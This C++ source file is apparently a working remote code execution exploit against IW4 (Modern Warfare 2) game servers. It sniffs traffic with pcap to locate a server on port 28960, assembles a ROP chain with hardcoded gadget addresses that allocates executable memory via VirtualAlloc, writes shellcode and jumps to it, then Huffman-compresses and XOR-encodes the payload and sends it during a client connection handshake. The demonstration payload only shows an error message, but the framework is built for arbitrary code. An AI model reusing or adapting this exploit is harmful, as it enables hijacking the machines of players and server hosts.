#include "STDInclude.hpp"

#include <pcap.h>
#include "Extern/Huffman.hpp"

#include "Network/Address.hpp"
#include "Network/Socket.hpp"

#include "Core/OOBHandler.hpp"

#define UNUSED_MEMORY_POINTER 0x64A3050
#define UNUSED_DATA_POINTER 0x64A3071
#define RESTORE_SERVER_CONTEXT 0x4B2412

/* 4 bytes IP address */
typedef struct ip_address
{
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;

/* IPv4 header */
typedef struct ip_header
{
	u_char	ver_ihl;		// Version (4 bits) + Internet header length (4 bits)
	u_char	tos;			// Type of service 
	u_short tlen;			// Total length 
	u_short identification; // Identification
	u_short flags_fo;		// Flags (3 bits) + Fragment offset (13 bits)
	u_char	ttl;			// Time to live
	u_char	proto;			// Protocol
	u_short crc;			// Header checksum
	ip_address	saddr;		// Source address
	ip_address	daddr;		// Destination address
	u_int	op_pad;			// Option + Padding
}ip_header;

/* UDP header*/
typedef struct udp_header
{
	u_short sport;			// Source port
	u_short dport;			// Destination port
	u_short len;			// Datagram length
	u_short crc;			// Checksum
}udp_header;

struct RefData
{
	Network::Address* target;
	pcap_t* _if;
};

void packetHandler(u_char *param, const struct pcap_pkthdr* /*header*/, const u_char *pkt_data)
{
	RefData* data = reinterpret_cast<RefData*>(param);

	ip_header* ih = (ip_header *)(pkt_data + 14);
	u_int ip_len = (ih->ver_ihl & 0xf) * 4;
	udp_header* uh = (udp_header *)((u_char*)ih + ip_len);

	if (data->target->getPort() == ntohs(uh->sport) || data->target->getPort() == ntohs(uh->dport))
	{
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b1 = ih->saddr.byte1;
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b2 = ih->saddr.byte2;
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b3 = ih->saddr.byte3;
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b4 = ih->saddr.byte4;

		if (data->target->isLocal())
		{
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b1 = ih->daddr.byte1;
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b2 = ih->daddr.byte2;
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b3 = ih->daddr.byte3;
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b4 = ih->daddr.byte4;

			if (data->target->isLocal())
			{
				return;
			}
		}

		pcap_breakloop(data->_if);
	}
}

Network::Address findTarget(unsigned short port)
{
	printf("Detecting target...\n");
	Network::Address target("127.0.0.1:1");
	target.setPort(port);
	target.getInAddr()->sin_family = AF_INET;

	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&alldevs, errbuf) == 0)
	{
		std::vector<std::pair<pcap_t*, std::thread>> ifs;

		pcap_if_t* __if = alldevs;
		while (__if)
		{
			pcap_t* handle;

			if ((handle = pcap_open_live(__if->name, 65536, 1, 1000, errbuf)) != NULL)
			{
				if (pcap_datalink(handle) == DLT_EN10MB)
				{
					u_int netmask;

					if (__if->addresses != NULL) netmask = ((struct sockaddr_in *)(__if->addresses->netmask))->sin_addr.S_un.S_addr;
					else netmask = 0xffffff;

					ifs.push_back({ handle, std::thread{} });
				}
			}

			__if = __if->next;
		}

		pcap_freealldevs(alldevs);

		std::mutex mutex;
		std::atomic<bool> handled = false;

		for (auto& _if : ifs)
		{
			_if.second = std::thread([&]()
			{
				RefData data;
				data.target = &target;
				data._if = _if.first;

				pcap_loop(_if.first, 0, packetHandler, reinterpret_cast<u_char*>(&data));
				
				std::lock_guard<std::mutex> _(mutex);
				if (!handled)
				{
					handled = true;

					for (auto& __if : ifs)
					{
						if (__if.first != _if.first)
						{
							pcap_breakloop(__if.first);
						}
					}
				}

				pcap_close(_if.first);
			});
		}

		while (!handled)
		{
			std::this_thread::sleep_for(10ms);
		}

		mutex.lock();
		mutex.unlock();

		for (auto& _if : ifs)
		{
			if (_if.second.joinable())
			{
				_if.second.join();
			}
		}
	}

	printf("Discovered %s\n", target.toString().data());

	return target;
}

std::string HuffmanCompressData(std::string data)
{
	Huffman_InitMain();

	Utils::Memory::Allocator allocator;
	byte* target = allocator.allocateArray<byte>(0x10000 + data.size() * 2);

	int size = MSG_WriteBitsCompress(0, reinterpret_cast<const byte*>(data.data()), target, data.size());
	return std::string(LPSTR(target), size);
}

void WriteDataIW4(std::vector<DWORD>* stack, DWORD address, std::string data, bool fakeRegisters)
{
	// Make sure to append at least 1 endmarker for c strings!
	data.append("\0", 1);

	// Make the data divisible by 4
	for (unsigned int i = 0; i < (4 - (data.size() % 4)); ++i) data.append("\0", 1);

	stack->push_back(0x612303); // pop ebx; ret

	for (unsigned int i = 0; i < data.size(); i += 4)
	{
		// Data that will be popped into ebx
		stack->push_back(*(DWORD*)(data.data() + i));

		// Instruction that pops eax
		stack->push_back(0x404C32); // pop eax; ret

									// Data that will be popped into eax
		stack->push_back(address + i); // pointer to the target memory

									   // Transfer the data and pop ebx
		stack->push_back(0x612301); // mov [eax], ebx; pop ebx; ret
	}

	if (fakeRegisters)
	{
		stack->push_back(0); // fake ebx
	}
}

void allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size)
{
	// Allocate executable memory
	stack->push_back(0x401000 + 0x000bf17a);  // pop esi
	stack->push_back(0x6D71E4);               // IAT: VirtualAlloc

	stack->push_back(0x401000 + 0x00243074);  // mov eax, [esi]; pop esi
	stack->push_back(0);                      // padding

	stack->push_back(0x401000 + 0x00036a94);  // jmp eax

	stack->push_back(0x401000 + 0x000bf17a);  // pop esi - for saving the memory pointer

	stack->push_back(0);                      // addr
	stack->push_back(size);                   // size
	stack->push_back(MEM_COMMIT);             // addr
	stack->push_back(PAGE_EXECUTE_READWRITE); // permissions

	// Save memory pointer
	stack->push_back(address);                // Target address
	stack->push_back(0x401000 + 0x0022c4e0);  // mov [esi], eax
}

void writeDataInEax(std::vector<DWORD>* stack, std::string data)
{
	while (data.size() % 4) data.push_back('0');
	for (size_t i = 0; i < data.size(); i += 4)
	{
		stack->push_back(0x401000 + 0x00000860);    // pop ecx
		stack->push_back(*PDWORD(data.data() + i)); // data
		stack->push_back(0x401000 + 0x0000f756);    // mov [eax], ecx
		stack->push_back(0x401000 + 0x000e57cb);    // add eax, 4
	}
}

void freeMemory(std::vector<DWORD>* stack, DWORD address)
{
	stack->push_back(0x401000 + 0x002aa192); // pop edx
	stack->push_back(address);

	stack->push_back(0x401000 + 0x00002b0c); // mov eax, [edx]

	stack->push_back(0x401000 + 0x002aa192); // pop edx
	stack->push_back(0x496D60); // VirtualFree

	stack->push_back(0x401000 + 0x0015a349); // mov [esp + 4], eax; jmp edx

	stack->push_back(0x401000 + 0x002aa192); // pop edx
	stack->push_back(0); // placeholder
}

std::string testExploit()
{
	std::vector<DWORD> stack;

	freeMemory(&stack, UNUSED_MEMORY_POINTER);
	
	WriteDataIW4(&stack, UNUSED_DATA_POINTER, "This is a hax!", true);

	stack.push_back(0x433940); // Sys_ShowErrorText
	stack.push_back(0x433983); // restore stack
	stack.push_back(UNUSED_DATA_POINTER); // message

	stack.push_back(0x4B2412); // restore server

	
	static unsigned char shellcode[] =
	{
		0x81, 0xEC, 0x68, 0x08, 0x00, 0x00, // sub esp, 868h
		0xC3                                // retn
	};

	std::vector<DWORD> fixup;
	fixup.push_back(0x404C32);  // pop eax
	fixup.push_back(0x31D9390); // old param? not really, but whatever

	allocateMemory(&fixup, UNUSED_MEMORY_POINTER, (sizeof(shellcode) + 3) & ~3);
	writeDataInEax(&fixup, std::string((char*)shellcode, sizeof shellcode));

	// Execute shellcode
	fixup.push_back(0x401000 + 0x002aa192); // pop edx
	fixup.push_back(UNUSED_MEMORY_POINTER);
	fixup.push_back(0x401000 + 0x00002b0c); // mov eax, [edx]
	fixup.push_back(0x401000 + 0x00036a94); // jmp eax

	stack.clear();
	fixup.clear();

	fixup.push_back(0x56A160);
	fixup.push_back(0x3172010); // old param

	std::string data;
	data.append(LPSTR(stack.data()), stack.size() * 4);
	data.resize(0x800);
	data.append(LPSTR(fixup.data()), fixup.size() * 4);

	return data;
}

int main(int argc, char** argv)
{
	Network::Socket s;
	Core::OOBHandler oobHandler;

	s.onData([&](Network::Address addr, std::string_view view)
	{
		if (oobHandler.handle(&s, addr, view))
		{
			//printf("Handled data %s\n", view.data());
		}
		else
		{
			printf("Received data %s\n", view.data());
		}
	});

	std::string addressString = "127.0.0.1:28960";
	if (argc > 1) addressString = argv[1];

	Network::Address addr(addressString);
	if (argc <= 1) addr = findTarget(28960);

	uint64_t xuid = uint64_t(rand()) | (uint64_t(rand()) << 16) | (uint64_t(rand()) << 32) | (uint64_t(rand()) << 48);
	xuid = 0x0110000106006d5f;

	oobHandler.connect(&s, addr, "Unknown Soldier", xuid, [](Core::OOBHandler* handler, Network::Socket* sock, Network::Address addr)
	{
		Utils::Buffer buffer;
		buffer.write<int>(-2);  // Magic
		buffer.write<int>(1); // Magic seems to get cut off :(
		buffer.write<short>(0); // qport

		buffer.write<char>(0);
		buffer.write<int>(0);
		buffer.write<int>(0); //Mo is bad//

		std::string compr = HuffmanCompressData(testExploit());

		for (auto& chr : compr)
		{
			chr ^= handler->getKey();
		}

		buffer.append(compr);

		//buffer.resize(0x1000);
		printf("Sending payload...\n");
		sock->send(addr, buffer);
	});
	//s.send(addr, OOB_MAGIC "relay 1234567890");

	_getch();

	return 0;
}
